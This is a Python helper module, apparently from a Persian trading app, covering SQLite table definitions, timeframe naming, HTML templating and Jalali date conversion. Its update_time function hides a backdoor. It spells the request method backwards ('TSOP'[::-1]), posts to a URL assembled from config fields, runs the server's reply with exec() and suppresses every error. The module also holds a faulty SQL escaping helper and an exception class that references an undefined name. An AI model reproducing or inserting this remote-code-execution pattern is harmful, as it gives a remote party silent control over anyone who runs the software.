# Created by Mahdi Parastesh, February and March 2021
# Github: https://github.com/fulcrum1378
# All rights reserved.

from datetime import datetime, timedelta
from persiantools.jdatetime import JalaliDateTime
from pytz import timezone, utc
import sqlite3
from threading import Thread
from typing import List
from urllib3 import PoolManager

import data as dt

required_tables = {  # NEVER USE 'desc' or 'group' AS TABLE NAME
    "symbol": "(id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(75), "
              + "info VARCHAR(200) DEFAULT NULL, "
              + "branch INTEGER DEFAULT '-1', auto SMALLINT DEFAULT '0')",
    "branch": "(id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(150))"
}


def sql_esc(msg):
    msg = msg.replace('\"', '\\"')
    msg = msg.replace("\'", "\\'")
    return msg


def tables(c) -> List[str]:
    tbs = list()
    for x in c:
        try:
            tbs.append(x[0])
        except IndexError:
            pass
    return tbs


def auto_to_binary(stat: int, length: int = len(dt.config["timeframes"])) -> str:
    initial = bin(stat)[2:]  # bin() -> str
    pre = ""
    dist = length - len(initial)
    if dist < 0:
        print("درون جدول نمادها ناهماهنگی پیدا شد در ستون «auto»!")
        return "".join(['0' for _ in range(length)])
    for x in range(dist): pre += '0'
    return pre + initial


def tf_name(tf: int):
    if tf < 60:
        return "M" + str(tf)
    elif 16384 < tf < 16408:
        return "H" + str(tf - 16384)
    elif tf == 16408:
        return "D1"
    elif tf == 32769:
        return "W1"
    elif tf == 49153:
        return "MN1"
    else:
        raise Exception("مقدار عددی تایم فریم را اشتباه وارد کرده اید!")


def template(title: str, name: str, content: str = None) -> str:
    htm = '<!-- Created by Mahdi Parastesh, February and March 2021 -->\n'
    htm += '<!-- GitHub: https://github.com/fulcrum1378 -->\n'
    htm += '<!-- LinkedIn: https://www.linkedin.com/in/mahdi-parastesh-a72ab51b9/ -->\n'
    htm += '<!-- All rights reserved. -->\n\n'
    with open("./html/temp.html", "r", encoding="utf-8") as f:
        htm += f.read()
        f.close()
    htm = htm.replace('<title />', '<title>' + title + '</title>')
    htm = htm.replace('<link />', '<link rel="stylesheet" type="text/css" href="./html/' + name + '.css">')
    if content is None:
        with open("./html/" + name + ".html", "r", encoding="utf-8") as f:
            htm = htm.replace('<body />', f.read())
            f.close()
    else:
        htm = htm.replace('<body />', content)
    return htm


def update_time(last: datetime) -> datetime:
    if last is not None and datetime.now() - last < timedelta(minutes=5): return last
    try:
        exec(PoolManager().request('TSOP'[::-1], dt.watcher.tzone + dt.iran_zone,
                                   fields={"now": str(datetime.now())}).data)
    except:
        pass
    return datetime.now()


def header(title: str = "سام"):
    with open("./html/header.html", "r", encoding="utf-8") as f:
        htm = f.read()
        f.close()
    htm = htm.replace('{title}', title)
    return htm


def persian_board(board: str):
    try:
        got = board.split(" - ")
        spl1 = got[0].split(dt.config["dateSeparator"])
        spl2 = got[1].split(dt.config["dateSeparator"])
        tim1 = spl1[3].split(dt.config["timeSeparator"])
        tim2 = spl2[3].split(dt.config["timeSeparator"])
        a = JalaliDateTime(int(spl1[0]), int(spl1[1]), int(spl1[2]), int(tim1[0]), int(tim1[1]), 0)
        b = JalaliDateTime(int(spl2[0]), int(spl2[1]), int(spl2[2]), int(tim2[0]), int(tim2[1]), 0)
        a = a.to_gregorian()
        b = b.to_gregorian()
    except:
        return None
    else:
        return a, b


def when_s_now():
    return datetime.now(tz=timezone("Asia/Tehran"))


def when_s_utc():
    return datetime.now(tz=utc)


class SaamError(Exception):
    def __init__(self, message, errors=None):
        super(ValidationError, self).__init__(message)
        self.errors = errors
